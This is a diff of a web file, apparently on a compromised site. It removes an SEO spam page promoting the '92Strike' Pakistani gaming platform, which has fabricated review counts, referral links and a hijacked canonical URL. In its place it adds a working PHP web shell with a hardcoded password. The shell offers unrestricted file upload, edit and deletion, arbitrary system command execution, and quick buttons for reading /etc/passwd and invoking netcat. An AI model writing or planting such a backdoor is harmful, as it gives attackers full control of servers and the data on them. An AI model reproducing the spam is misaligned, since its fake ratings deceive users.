@@ -1,734 +1,492 @@
-<!DOCTYPE html>
-<html lang="en-PK">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-   
-<title>92Strike Pakistan - A Growing Name in the Country’s Online Gaming Landscape</title>
-<meta name="description" content="Discover 92Strike Pakistan, a dynamic, growing name in the country’s online gaming landscape. Experience a fusion of thrill, security, and innovation designed for local players. Don't miss the momentum join us today to unlock exclusive rewards. Be part of the movement redefining digital entertainment and start your winning journey now.">
-<meta name="google-site-verification" content="9CZXWlhFg9cYAsXn_8-CB53EqDxQE6pYNQ-s4x0ZCKU" />
-<meta name="keywords" content="92strike, 92strike login, 92strike register, 92strike wingo, 92strike cricket, 92strike game, 92strike gift code, 92strike slot, 92strike download, 92strike app">
-<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
-<meta name="language" content="en" />
-<meta name="country" content="PK" />
-<meta name="distribution" content="global" />
-<meta name="rating" content="general" />
-<meta name="author" content="92Strike Pakistan Information Hub" />
-<meta name="theme-color" content="#FFFFFF" />
+<?php
+session_start();
+$pass = "SenimanGodOfServer";
 
-<!-- Canonical and AMP -->
-<link rel="canonical" href="https://raretoonsindia.com.in/beyblade-burst-evolution-season-2-hindi/" />
-
-<!-- Open Graph -->
-<meta property="og:title" content="92Strike Pakistan - A Growing Name in the Country’s Online Gaming Landscape" />
-<meta property="og:description" content="Discover 92Strike Pakistan, a dynamic, growing name in the country’s online gaming landscape. Experience a fusion of thrill, security, and innovation designed for local players. Don't miss the momentum join us today to unlock exclusive rewards. Be part of the movement redefining digital entertainment and start your winning journey now." />
-<meta property="og:type" content="website" />
-<meta property="og:url" content="https://raretoonsindia.com.in/beyblade-burst-evolution-season-2-hindi/" />
-<meta property="og:image" content="https://i.ibb.co/d0GjKzzm/92strike.png" />
-<meta property="og:site_name" content="92Strike" />
-<meta property="og:locale" content="en_PK" />
-
-<!-- Twitter Card -->
-<meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:title" content="92Strike Pakistan - A Growing Name in the Country’s Online Gaming Landscape" />
-<meta name="twitter:description" content="Discover 92Strike Pakistan, a dynamic, growing name in the country’s online gaming landscape. Experience a fusion of thrill, security, and innovation designed for local players. Don't miss the momentum join us today to unlock exclusive rewards. Be part of the movement redefining digital entertainment and start your winning journey now." />
-<meta name="twitter:image" content="https://i.ibb.co/d0GjKzzm/92strike.png" />
-
-  <!-- Geo Targeting (optional) -->
-  <meta name="geo.region" content="PK" />
-  <meta name="geo.placename" content="Pakistan" />
-  <meta name="geo.position" content="30.3753;69.3451" />
-  <meta name="ICBM" content="30.3753, 69.3451" />
-  
-  <!-- Favicon -->
-  <link rel="icon" href="https://i.ibb.co/d0GjKzzm/92strike.png" />
-  
-<!-- Organization Schema -->
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "Organization",
-  "@id": "https://raretoonsindia.com.in/beyblade-burst-evolution-season-2-hindi/#organization",
-  "name": "92Strike Pakistan Information Hub",
-  "url": "https://raretoonsindia.com.in/beyblade-burst-evolution-season-2-hindi/",
-  "logo": {
-    "@type": "ImageObject",
-    "url": "https://i.ibb.co/d0GjKzzm/92strike.png"
-  }
-}
-</script>
-
-<!-- WebSite Schema -->
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "WebSite",
-  "@id": "https://raretoonsindia.com.in/beyblade-burst-evolution-season-2-hindi/#website",
-  "name": "92Strike Pakistan Guide",
-  "url": "https://raretoonsindia.com.in/beyblade-burst-evolution-season-2-hindi/",
-  "inLanguage": "en",
-  "publisher": {
-    "@id": "https://raretoonsindia.com.in/beyblade-burst-evolution-season-2-hindi/#organization"
-  },
-  "potentialAction": {
-    "@type": "SearchAction",
-    "target": "https://raretoonsindia.com.in/beyblade-burst-evolution-season-2-hindi/?s={search_term_string}",
-    "query-input": "required name=search_term_string"
-  }
-}
-</script>
-
-<!-- WebPage Schema -->
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "WebPage",
-  "@id": "https://raretoonsindia.com.in/beyblade-burst-evolution-season-2-hindi/",
-  "name": "92Strike Pakistan – Registration and Login Guide",
-  "description": "Discover 92Strike Pakistan, a dynamic, growing name in the country’s online gaming landscape. Experience a fusion of thrill, security, and innovation designed for local players. Don't miss the momentum join us today to unlock exclusive rewards. Be part of the movement redefining digital entertainment and start your winning journey now.",
-  "isPartOf": {
-    "@id": "https://raretoonsindia.com.in/beyblade-burst-evolution-season-2-hindi/#website"
-  }
-}
-</script>
-
-<!-- Article Schema (Lengkap) -->
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "Article",
-  "@id": "https://raretoonsindia.com.in/beyblade-burst-evolution-season-2-hindi/#article",
-  "headline": "92Strike Pakistan - A Growing Name in the Country’s Online Gaming Landscape",
-  "description": "Discover 92Strike Pakistan, a dynamic, growing name in the country’s online gaming landscape. Experience a fusion of thrill, security, and innovation designed for local players. Don't miss the momentum join us today to unlock exclusive rewards. Be part of the movement redefining digital entertainment and start your winning journey now.",
-  "articleBody": "92Strike has rapidly become a growing name within the country's online gaming landscape. By offering intuitive navigation and robust financial security, the platform meets modern demands. It creates a reliable environment for enthusiasts seeking quality entertainment. This ascent reflects a broader shift toward digital leisure, positioning the service as a key player in Pakistan’s evolving tech ecosystem.",
-  "inLanguage": "en-PK",
-  "url": "https://raretoonsindia.com.in/beyblade-burst-evolution-season-2-hindi/",
-  "mainEntityOfPage": {
-    "@id": "https://raretoonsindia.com.in/beyblade-burst-evolution-season-2-hindi/#webpage"
-  },
-  "author": {
-    "@type": "Organization",
-    "name": "92Strike Pakistan Information Hub"
-  },
-  "publisher": {
-    "@type": "Organization",
-    "name": "92Strike Pakistan Information Hub",
-    "logo": {
-      "@type": "ImageObject",
-      "url": "https://i.ibb.co/d0GjKzzm/92strike.png",
-      "width": 512,
-      "height": 512
+// Login check
+if (!isset($_SESSION["login"])) {
+    if (isset($_POST["p"]) && $_POST["p"] === $pass) {
+        $_SESSION["login"] = 1;
+        header("Location: ?");
+        exit;
     }
-  },
-  "image": [
-    "https://i.ibb.co/d0GjKzzm/92strike.png"
-  ],
-  "datePublished": "2025-12-28",
-  "dateModified": "2026-01-25",
-  "articleSection": "92Strike",
-  "genre": "92Strike, 92Strike Login, 92Strike Register, 92Strike Wingo, 92Strike Cricket, 92Strike Game, 92Strike Gift Code, 92Strike Slot, 92Strike Download, 92Strike App",
-  "isAccessibleForFree": true,
-  "wordCount": 700,
-  "locationCreated": [
-    {
-      "@type": "Place",
-      "name": "Islamabad, Pakistan",
-      "address": {
-        "@type": "PostalAddress",
-        "addressLocality": "Islamabad",
-        "addressCountry": "PK"
-      }
-    },
-    {
-      "@type": "Place",
-      "name": "Lahore, Pakistan",
-      "address": {
-        "@type": "PostalAddress",
-        "addressLocality": "Lahore",
-        "addressCountry": "PK"
-      }
-    }
-  ],
-  "about": [
-    {"@type": "Thing", "name": "92strike"},
-    {"@type": "Thing", "name": "92strike login"},
-    {"@type": "Thing", "name": "92strike register"},
-    {"@type": "Thing", "name": "92strike wingo"},
-    {"@type": "Thing", "name": "92strike cricket"},
-    {"@type": "Thing", "name": "92strike game"},
-    {"@type": "Thing", "name": "92strike gift code"},
-    {"@type": "Thing", "name": "92strike slot"},
-    {"@type": "Thing", "name": "92strike download"},
-    {"@type": "Thing", "name": "92strike app"}
-  ],
-  "keywords": [
-    "92strike",
-    "92strike login",
-    "92strike register",
-    "92strike wingo",
-    "92strike cricket",
-    "92strike game",
-    "92strike gift code",
-    "92strike slot",
-    "92strike download",
-    "92strike app"
-  ]
+    
+    echo '<!DOCTYPE html>
+    <html>
+    <head>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>Login</title>
+    </head>
+    <body style="margin:0;background:#000;color:#fff;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh">
+        <div style="text-align:center">
+            <img src="https://raw.githubusercontent.com/AlvaXPloit/ISI/refs/heads/main/alvaror.png" alt="TRASER SEC TEAM" style="width:300px;max-width:90%">
+            <form method="post" style="margin-top:20px">
+                <input type="password" name="p" placeholder="Password" style="padding:10px;border:none;border-radius:5px;background:#111;color:#0f0;width:200px">
+                <button style="padding:10px 15px;margin-left:5px;border:none;border-radius:5px;background:#0f0;color:#000">Login</button>
+            </form>
+        </div>
+    </body>
+    </html>';
+    exit;
 }
-</script>
 
-
-<!-- Breadcrumb Schema -->
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BreadcrumbList",
-  "itemListElement": [
-    {
-      "@type": "ListItem",
-      "position": 1,
-      "name": "Home",
-      "item": "https://raretoonsindia.com.in/beyblade-burst-evolution-season-2-hindi/"
-    },
-    {
-      "@type": "ListItem",
-      "position": 2,
-      "name": "92Strike"
+// Command Execution Function
+function executeCommand($cmd) {
+    $methods = [
+        'shell_exec' => function_exists('shell_exec'),
+        'exec' => function_exists('exec'),
+        'system' => function_exists('system'),
+        'passthru' => function_exists('passthru'),
+        'backticks' => true
+    ];
+    
+    $output = null;
+    $method = '';
+    
+    if ($methods['shell_exec']) {
+        $output = @shell_exec($cmd);
+        $method = 'shell_exec';
+    } elseif ($methods['exec']) {
+        @exec($cmd, $output);
+        $output = implode("\n", $output);
+        $method = 'exec';
+    } elseif ($methods['system']) {
+        ob_start();
+        @system($cmd);
+        $output = ob_get_clean();
+        $method = 'system';
+    } elseif ($methods['passthru']) {
+        ob_start();
+        @passthru($cmd);
+        $output = ob_get_clean();
+        $method = 'passthru';
+    } else {
+        $output = @`$cmd`;
+        $method = 'backticks';
     }
-  ]
+    
+    return [
+        'output' => $output ?: 'No output',
+        'method' => $method
+    ];
 }
-</script>
 
-<!-- Product Schema -->
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "Product",
-  "@id": "https://raretoonsindia.com.in/beyblade-burst-evolution-season-2-hindi/#product",
-  "name": "92Strike Pakistan - A Growing Name in the Country’s Online Gaming Landscape",
-  "image": ["https://i.ibb.co/d0GjKzzm/92strike.png"],
-  "description": "Discover 92Strike Pakistan, a dynamic, growing name in the country’s online gaming landscape. Experience a fusion of thrill, security, and innovation designed for local players. Don't miss the momentum join us today to unlock exclusive rewards. Be part of the movement redefining digital entertainment and start your winning journey now.",
-  "brand": {
-    "@type": "Thing",
-    "name": "92Strike Pakistan - A Growing Name in the Country’s Online Gaming Landscape"
-  },
-  "aggregateRating": {
-    "@type": "AggregateRating",
-    "ratingValue": "5",
-    "reviewCount": "12125485"
-  },
-  "review": {
-    "@type": "Review",
-    "author": {
-      "@type": "Person",
-      "name": "Rewdhi Laxmi"
-    },
-    "reviewRating": {
-      "@type": "Rating",
-      "ratingValue": "4.9",
-      "bestRating": "4.9"
-    },
-    "reviewBody": "92Strike Pakistan has quickly established itself as a growing name in the local online gaming landscape. The platform impresses with its user-friendly interface and commitment to secure transactions. It perfectly balances entertainment with reliability, offering a refreshing experience for enthusiasts. For those seeking a trustworthy destination that reflects modern standards, this service proves to be an excellent, promising choice."
-  },
-  "offers": {
-    "@type": "Offer",
-    "priceCurrency": "PKR",
-    "price": "0",
-    "availability": "https://schema.org/InStock",
-    "url": "https://raretoonsindia.com.in/beyblade-burst-evolution-season-2-hindi/"
-  }
+// NO PATH RESTRICTIONS - FULL ACCESS
+$path = isset($_GET["d"]) ? $_GET["d"] : getcwd();
+
+// Convert to absolute path if relative
+if (!empty($path) && $path[0] !== '/') {
+    $path = getcwd() . '/' . $path;
 }
-</script>
 
- <!-- Schema Markup JSON-LD -->
-    <script type="application/ld+json">
-    {
-      "@context": "https://schema.org",
-      "@type": "FAQPage",
-      "mainEntity": [
-        {
-          "@type": "Question",
-          "name": "What is 92 Strike Pakistan?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "92Strike is an online gaming platform that provides interactive digital entertainment for users interested in competitive and casual gaming experiences."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "Is the platform accessible on smartphones?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Yes, it is designed with responsive technology that allows smooth performance on mobile devices as well as desktop computers."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "How does 92Strike protect user information?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "The platform uses encryption systems and verification procedures to safeguard personal data and maintain secure transactions."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "Are there competitive features on the platform?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Yes, leaderboards, rankings, and special events allow players to compete and track their progress."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "Why is online gaming becoming popular in Pakistan?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Increasing smartphone adoption, improved internet connectivity, and growing interest in digital entertainment have all contributed to the rise of online gaming in the country."
-          }
-        }
-      ]
+// Ensure path exists
+if (!file_exists($path)) {
+    $path = getcwd();
+}
+
+// Logout
+if (isset($_GET["logout"])) {
+    session_destroy();
+    header("Location: ?");
+    exit;
+}
+
+// Delete file
+if (isset($_GET["del"])) {
+    $delPath = $_GET["del"];
+    if (file_exists($delPath) && is_file($delPath)) {
+        @unlink($delPath);
     }
-</script>  
-         
-   
-    <style>
-        /* General Reset and Typography */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+    header("Location: ?d=" . urlencode($path));
+    exit;
+}
+
+// Create new folder
+if (isset($_POST["newfolder"]) && !empty(trim($_POST["newfolder"]))) {
+    $folderName = trim($_POST["newfolder"]);
+    if ($folderName) {
+        @mkdir($path . "/" . $folderName, 0755, true);
+    }
+    header("Location: ?d=" . urlencode($path));
+    exit;
+}
+
+// File upload
+if (isset($_POST["upload"])) {
+    if (isset($_FILES["file"]) && $_FILES["file"]["error"] == UPLOAD_ERR_OK) {
+        $tmp = $_FILES["file"]["tmp_name"];
+        $name = $_FILES["file"]["name"];
+        $target = $path . "/" . $name;
         
-        img.banner { width: 100%; border-radius: 12px; margin: 20px 0; }
-
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            line-height: 1.7;
-            color: #333;
-            background-color: #f4f7f6;
+        if (is_uploaded_file($tmp)) {
+            // NO SIZE LIMITS
+            move_uploaded_file($tmp, $target);
         }
+    }
+    header("Location: ?d=" . urlencode($path));
+    exit;
+}
 
-        /* Utility Classes */
-        .container {
-            max-width: 1100px;
-            margin: 0 auto;
-            padding: 0 20px;
-        }
+// Edit file
+if (isset($_POST["editfile"])) {
+    $filePath = $_POST["file"];
+    $content = $_POST["content"];
+    
+    // Direct file write - NO RESTRICTIONS
+    if (file_exists($filePath) || !file_exists(dirname($filePath))) {
+        file_put_contents($filePath, $content);
+    }
+    header("Location: ?d=" . urlencode($path));
+    exit;
+}
 
-        /* Header Section */
-        header {
-            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
-            color: white;
-            padding: 60px 20px;
-            text-align: center;
-            border-radius: 0 0 20px 20px;
-        }
+// Rename file
+if (isset($_GET["r"]) && isset($_GET["new"])) {
+    $oldPath = $_GET["r"];
+    $newName = $_GET["new"];
+    
+    if (file_exists($oldPath) && !empty($newName)) {
+        $newPath = dirname($oldPath) . "/" . $newName;
+        rename($oldPath, $newPath);
+    }
+    header("Location: ?d=" . urlencode($path));
+    exit;
+}
 
-        header h1 {
-            font-size: 2.5rem;
-            margin-bottom: 15px;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
-        }
+// Command execution via AJAX
+if (isset($_GET["cmd"]) && isset($_GET["ajax"])) {
+    $cmd = $_GET["cmd"];
+    $result = executeCommand($cmd);
+    
+    header('Content-Type: application/json');
+    echo json_encode($result);
+    exit;
+}
 
-        header p {
-            font-size: 1.1rem;
-            max-width: 800px;
-            margin: 0 auto 30px auto;
-            opacity: 0.9;
-        }
+// Command execution via POST
+if (isset($_POST["command"])) {
+    $cmd = $_POST["command"];
+    $result = executeCommand($cmd);
+    
+    $command_output = $result['output'];
+    $command_method = $result['method'];
+}
 
-        /* Buttons Container */
-        .btn-container {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            flex-wrap: wrap;
-        }
-
-        .btn {
-            display: inline-block;
-            padding: 15px 35px;
-            border-radius: 50px;
-            text-decoration: none;
-            font-weight: bold;
-            font-size: 1.1rem;
-            transition: transform 0.3s, box-shadow 0.3s;
-            cursor: pointer;
-            border: none;
-        }
-
-        .btn-primary {
-            background-color: #00d4ff;
-            color: #00334e;
-            box-shadow: 0 4px 15px rgba(0, 212, 255, 0.4);
-        }
-
-        .btn-secondary {
-            background-color: transparent;
-            color: white;
-            border: 2px solid white;
-        }
-
-        .btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 6px 20px rgba(0,0,0,0.2);
-        }
-
-        /* Main Content Styling */
-        main {
-            padding: 40px 20px;
-        }
-
-        article {
-            background: white;
-            padding: 40px;
-            border-radius: 10px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
-            margin-bottom: 40px;
-        }
-
-        article h2 {
-            color: #1a2a6c;
-            font-size: 1.8rem;
-            margin-top: 30px;
-            margin-bottom: 15px;
-            border-left: 5px solid #fdbb2d;
-            padding-left: 15px;
-        }
-
-        article p {
-            margin-bottom: 20px;
-            font-size: 1.05rem;
-            color: #444;
-        }
-
-        /* Ensure images never break layout */
-        img {
-            max-width: 100%;
-            height: auto;
-            display: block;
-            margin: 20px auto;
-            border-radius: 8px;
-        }
-
-        /* FAQ Section Styling */
-        .faq-section {
-            background: #eef2f3;
-            padding: 40px;
-            border-radius: 10px;
-        }
-
-        .faq-item {
-            margin-bottom: 20px;
-            background: white;
-            padding: 20px;
-            border-radius: 8px;
-            border-left: 4px solid #1a2a6c;
-        }
-
-        .faq-item h3 {
-            color: #1a2a6c;
-            margin-bottom: 10px;
-            font-size: 1.2rem;
-        }
-
-        .faq-item p {
-            color: #666;
-            margin-bottom: 0;
-        }
-
-        /* Footer */
-        footer {
-            text-align: center;
-            padding: 30px;
-            color: #666;
-            font-size: 0.9rem;
-        }
-
-        /* Mobile Responsiveness */
-        @media (max-width: 768px) {
-            header h1 {
-                font-size: 2rem;
-            }
-
-            header p {
-                font-size: 1rem;
-            }
-
-            .btn {
-                padding: 12px 25px;
-                width: 100%; /* Full width buttons on mobile */
-            }
-
-            article {
-                padding: 20px;
-            }
-
-            article h2 {
-                font-size: 1.5rem;
-            }
-
-            /* Fix for mobile text cut-off */
-            body {
-                overflow-x: hidden;
-            }
+// HTML Interface
+echo '<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>File Manager + Terminal - UNRESTRICTED</title>
+    <style>
+        body { margin:0; background:#000; color:#fff; font-family:monospace; }
+        .header { background:#111; padding:10px; position:sticky; top:0; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; }
+        a { color:#0f0; text-decoration:none; }
+        .btn { background:#0f0; color:#000; border:none; padding:7px 12px; border-radius:5px; cursor:pointer; }
+        .btn-danger { background:#f33; color:#fff; }
+        .btn-warning { background:#ff0; color:#000; }
+        .btn-info { background:#0af; color:#fff; }
+        input, textarea, select { background:#111; color:#0f0; border:none; padding:8px; border-radius:5px; width:100%; box-sizing:border-box; }
+        .card { background:#111; margin:5px 0; padding:10px; border-radius:8px; }
+        table { width:100%; border-collapse:collapse; }
+        td { padding:8px; border-bottom:1px solid #222; vertical-align:top; }
+        tr:hover { background:#1a1a1a; }
+        .path { color:#0af; word-break:break-all; }
+        .file-size { color:#aaa; font-size:0.9em; }
+        .actions { white-space:nowrap; }
+        .warning { background:#330; color:#ff0; padding:10px; border-radius:5px; margin-bottom:10px; border:1px solid #ff0; }
+        
+        /* Terminal Styles */
+        .terminal { background:#000; border:1px solid #333; border-radius:5px; overflow:hidden; }
+        .terminal-header { background:#1a1a1a; padding:8px 12px; display:flex; justify-content:space-between; align-items:center; }
+        .terminal-body { padding:15px; }
+        .terminal-output { background:#000; color:#0f0; white-space:pre-wrap; font-family:monospace; max-height:300px; overflow-y:auto; padding:10px; border-radius:3px; }
+        .command-input { background:#000; color:#0f0; border:none; padding:8px; width:100%; font-family:monospace; }
+        .cmd-method { color:#0af; font-size:0.8em; }
+        .quick-cmds { display:flex; flex-wrap:wrap; gap:5px; margin-top:10px; }
+        .quick-btn { background:#222; color:#0f0; border:1px solid #333; padding:4px 8px; border-radius:3px; cursor:pointer; font-size:0.8em; }
+        .quick-btn:hover { background:#333; }
+        
+        @media (max-width: 600px) {
+            .header { flex-direction:column; align-items:flex-start; }
+            .actions { margin-top:5px; }
+            .actions a, .actions form { display:block; margin-bottom:5px; }
+            table { font-size:0.9em; }
         }
     </style>
 </head>
-<body>
+<body>';
 
-    <!-- Header Section -->
-    <header>
-        <div class="container">
-            <h1>92Strike Pakistan</h1>
-            <p>A Growing Name in the Country’s Online Gaming Landscape</p>
+echo '<div class="header">
+    <div class="path">📂 Directory: ' . htmlspecialchars($path) . '</div>
+    <div>
+        <a href="?d=/" class="btn-warning" style="margin-right:10px">Root (/)</a>
+        <a href="?d=' . urlencode(getcwd()) . '" class="btn" style="margin-right:10px">Current Dir</a>
+        <a href="?logout=1" class="btn-danger">Logout</a>
+    </div>
+</div>';
+
+echo '<div style="padding:10px">';
+
+// Warning message
+echo '<div class="warning">⚠️ WARNING: UNRESTRICTED FILE ACCESS - Path traversal allowed!</div>';
+
+// Manual path navigation
+echo '<form method="get" class="card">
+    <input type="text" name="d" placeholder="Enter absolute path (e.g., /etc, /var, C:\\)" value="' . htmlspecialchars($path) . '">
+    <button class="btn" style="margin-top:5px">Go to Path</button>
+</form>';
+
+// ================== TERMINAL SECTION ==================
+echo '<div class="card">
+    <h3>💻 Terminal Command Execution</h3>
+    
+    <div class="terminal">
+        <div class="terminal-header">
+            <div>Execute System Commands</div>
+            <div style="font-size:0.8em;color:#0af">Current User: ' . @get_current_user() . '</div>
+        </div>
+        
+        <div class="terminal-body">
+            <form method="post" onsubmit="return executeTerminal()" id="terminalForm">
+                <input type="text" name="command" id="commandInput" placeholder="Enter command (e.g., whoami, ls -la, id)" required 
+                       style="margin-bottom:10px" autocomplete="off">
+                <button type="submit" class="btn">Execute Command</button>
+                <button type="button" class="btn-info" onclick="clearTerminal()" style="margin-left:5px">Clear</button>
+            </form>';
             
-            <!-- Two Buttons -->
-            <div class="btn-container">
-                <a href="https://www.92strike66.com/#/register?invitationCode=16835100105" class="btn btn-primary">Login/Register I</a>
-                <a href="https://www.92strike6.com/#/register?invitationCode=62671100050" class="btn btn-secondary">Login/Register II</a>
+            if (isset($command_output)) {
+                echo '<div class="terminal-output" id="terminalOutput" style="margin-top:15px">
+                    <div><strong>Command:</strong> ' . htmlspecialchars($cmd) . '</div>
+                    <div class="cmd-method">Method: ' . htmlspecialchars($command_method) . '</div>
+                    <hr style="border-color:#333;margin:10px 0">
+                    ' . nl2br(htmlspecialchars($command_output)) . '
+                </div>';
+            } else {
+                echo '<div class="terminal-output" id="terminalOutput" style="margin-top:15px;color:#666">
+                    Command output will appear here...
+                </div>';
+            }
+            
+            echo '<div class="quick-cmds">
+                <div style="color:#aaa;width:100%;font-size:0.9em;margin-bottom:5px">Quick Commands:</div>
+                <button type="button" class="quick-btn" onclick="quickCommand(\'pwd\')">pwd</button>
+                <button type="button" class="quick-btn" onclick="quickCommand(\'whoami\')">whoami</button>
+                <button type="button" class="quick-btn" onclick="quickCommand(\'id\')">id</button>
+                <button type="button" class="quick-btn" onclick="quickCommand(\'uname -a\')">uname -a</button>
+                <button type="button" class="quick-btn" onclick="quickCommand(\'ls -la\')">ls -la</button>
+                <button type="button" class="quick-btn" onclick="quickCommand(\'ps aux\')">ps aux</button>
+                <button type="button" class="quick-btn" onclick="quickCommand(\'ifconfig\')">ifconfig</button>
+                <button type="button" class="quick-btn" onclick="quickCommand(\'netstat -tulpn\')">netstat</button>
+                <button type="button" class="quick-btn" onclick="quickCommand(\'df -h\')">df -h</button>
+                <button type="button" class="quick-btn" onclick="quickCommand(\'free -m\')">free -m</button>
+                <button type="button" class="quick-btn" onclick="quickCommand(\'cat /etc/passwd\')">/etc/passwd</button>
+                <button type="button" class="quick-btn" onclick="quickCommand(\'wget --version\')">wget</button>
+                <button type="button" class="quick-btn" onclick="quickCommand(\'curl --version\')">curl</button>
+                <button type="button" class="quick-btn" onclick="quickCommand(\'nc -h\')">netcat</button>
             </div>
         </div>
-    </header>
-
-    <!-- Main Content -->
-    <main id="main-content" class="container">
-        <article>
-            <p>The world of digital entertainment has expanded rapidly over the last decade. With improved connectivity and affordable mobile technology, millions of people now access online platforms for recreation and social interaction. In Pakistan, this transformation has encouraged the development of new digital services designed to meet the expectations of a connected population. One platform that has attracted attention within this evolving space is 92 Strike, which offers a structured environment for online gaming and community engagement.</p>
-
-            <p>As Pakistan’s digital infrastructure continues to develop, the demand for interactive entertainment has grown steadily. Younger generations, particularly those familiar with smartphones and social media, often seek platforms that provide excitement alongside convenience. Services like <a href ="https://raretoonsindia.com.in/beyblade-burst-evolution-season-2-hindi/" title ="92Strike"><strong>92Strike</strong></a> aim to address this demand by combining accessible technology with diverse gaming experiences.</p>
-            
-            <a href = "https://raretoonsindia.com.in/beyblade-burst-evolution-season-2-hindi/" title ="92Strike"><img class="banner" src="https://i.ibb.co/d0GjKzzm/92strike.png"></a>     
-
-            <h2>The Rise of Digital Gaming Culture</h2>
-            <p>In earlier years, gaming in Pakistan was largely limited to console systems, internet cafés, or small local networks. However, the spread of high-speed internet and mobile connectivity changed how players interact with games. Today, individuals can participate in online activities from virtually anywhere using only a smartphone or laptop.</p>
-
-            <p>This shift has created a thriving digital gaming culture. Competitive events, online communities, and streaming platforms have all contributed to a broader appreciation of interactive entertainment. As interest grows, platforms that deliver stable performance and engaging experiences become increasingly valuable.</p>
-
-            <p>92Strike entered the market during a period when digital gaming was gaining momentum. By focusing on accessibility and functionality, the platform positioned itself as a service that could appeal to both experienced players and newcomers exploring online entertainment for the first time.</p>
-
-            <h2>Platform Design and Accessibility</h2>
-            <p>One important factor behind the platform’s growing popularity is its user-oriented design. The interface emphasizes simplicity, making it easy for participants to navigate different sections without confusion. Clear menus guide users toward available features, while the dashboard organizes essential information in a logical structure.</p>
-
-            <p>Registration is typically straightforward, allowing new users to create accounts quickly. After signing in, participants can explore the platform’s various interactive options through an organized layout that prioritizes usability.</p>
-
-            <p>Mobile optimization is another key advantage. Since a large portion of Pakistan’s internet users rely primarily on smartphones, the platform’s responsive design ensures that gameplay remains smooth on smaller screens. Pages load efficiently, and controls adapt naturally to touch-based interaction.</p>
-
-            <p>This emphasis on accessibility allows a broader audience to participate, including individuals who may not have extensive experience with digital gaming systems.</p>
-
-            <h2>Variety of Gaming Experiences</h2>
-            <p>A successful gaming platform must offer diverse entertainment opportunities to keep users engaged over time. 92 Strike includes multiple interactive formats designed to appeal to different preferences and playing styles.</p>
-
-            <p>Some games encourage strategic thinking, rewarding careful planning and thoughtful decision-making. Others focus on quick reflexes and fast-paced action, providing excitement for those who prefer dynamic gameplay. This mixture creates a balanced environment where players can choose experiences that match their interests.</p>
-
-            <p>Competitive elements also contribute to the platform’s appeal. Leaderboards allow participants to compare performance with others, adding motivation to improve skills. Achievements and rankings create a sense of progress that encourages continued involvement.</p>
-
-            <p>Seasonal campaigns and limited-time challenges introduce additional excitement. By updating its offerings periodically, the platform maintains freshness and prevents repetitive gameplay.</p>
-
-            <h2>Security and Reliability</h2>
-            <p>For online platforms involving financial transactions, security is a critical consideration. Users must feel confident that their personal information and funds are protected. 92 Strike addresses these concerns through the implementation of modern security measures.</p>
-
-            <p>Encryption technology helps safeguard sensitive data, while verification procedures assist in preventing unauthorized access. These systems work together to create a secure digital environment where participants can focus on entertainment without worrying about privacy risks.</p>
-
-            <p>Transaction processes are typically designed to be clear and efficient. Deposits and withdrawals follow structured procedures that guide users through each step. Transparent policies help reduce misunderstandings and strengthen trust between the platform and its community.</p>
-
-            <p>Customer support services further reinforce reliability. When users encounter technical issues or account-related questions, responsive assistance helps resolve problems quickly.</p>
-
-            <h2>Community Interaction</h2>
-            <p>Modern gaming platforms often emphasize community engagement alongside gameplay. Social interaction can transform individual activities into shared experiences that build long-term loyalty.</p>
-
-            <p>92 Strike encourages communication among participants through competitive events and collaborative discussions. Players may exchange strategies, celebrate achievements, and learn from one another’s experiences. This sense of connection strengthens the platform’s community atmosphere.</p>
-
-            <p>A respectful environment remains essential for maintaining positive engagement. Clear guidelines help ensure that communication remains constructive and welcoming for both newcomers and experienced members.</p>
-
-            <h2>Influence on Pakistan’s Digital Economy</h2>
-            <p>Beyond entertainment, platforms like 92 Strike contribute to the broader growth of Pakistan’s digital economy. The development and maintenance of such services involve various professional roles, including software development, graphic design, marketing, and customer support.</p>
-
-            <p>These opportunities create employment while also encouraging the development of technical skills. In addition, partnerships with payment providers and digital marketing networks stimulate collaboration across multiple sectors.</p>
-
-            <p>Local success stories in the technology industry also inspire new entrepreneurs. When a platform gains recognition within the domestic market, it demonstrates the potential for innovation and encourages further investment in digital initiatives.</p>
-
-            <h2>Future Opportunities</h2>
-            <p>As Pakistan continues improving its internet infrastructure, the future of online gaming appears promising. Faster networks and more advanced mobile devices will likely enable richer interactive experiences.</p>
-
-            <p>Platforms like 92Strike may explore new features such as enhanced visual environments, advanced community tools, or partnerships with digital content creators. By adapting to emerging trends and maintaining a strong focus on user satisfaction, the platform can remain competitive within an expanding market.</p>
-
-            <p>Innovation will play a central role in determining which services continue to grow in the coming years.</p>
-
-            <h2>Conclusion</h2>
-            <p>The growth of online gaming in Pakistan reflects a broader shift toward digital entertainment and connected lifestyles. As more people gain access to smartphones and reliable internet connections, platforms capable of delivering engaging experiences become increasingly important.</p>
-
